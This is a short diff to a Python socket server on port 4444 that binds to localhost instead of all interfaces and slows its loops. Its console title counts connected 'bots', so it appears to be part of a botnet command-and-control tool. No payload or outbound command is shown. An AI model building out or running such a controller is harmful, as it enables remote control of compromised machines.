@@ -4,7 +4,7 @@ import time
 import sys
 import os
 
-host = "0.0.0.0"
+host = "127.0.0.1"
 port = 4444
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -87,11 +87,12 @@ def title():
     while 1:
         if sys.platform != "linux":
             os.system(f"title bots: {len(clients)}")
+            time.sleep(5)
 
 
 def ping():
     while True:
-        time.sleep(1)
+        time.sleep(5)
 
         if len(clients) > 0:
             for client in clients:
